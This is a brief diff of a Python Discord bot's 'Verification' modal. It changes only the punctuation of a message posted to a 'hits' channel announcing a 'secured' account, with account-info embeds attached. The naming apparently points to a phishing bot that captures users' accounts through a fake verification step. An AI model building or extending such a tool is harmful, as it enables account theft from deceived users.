@@ -239,7 +239,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                         )
                         return
                     
-                    await hits_channel.send("@everyone **Successfully secured an account.**")
+                    await hits_channel.send("@everyone **Successfully secured an account**")
                     await hits_channel.send(
                         embed = finalEmbeds[0],
                         view = accountInfo(finalEmbeds[1], interaction.user)
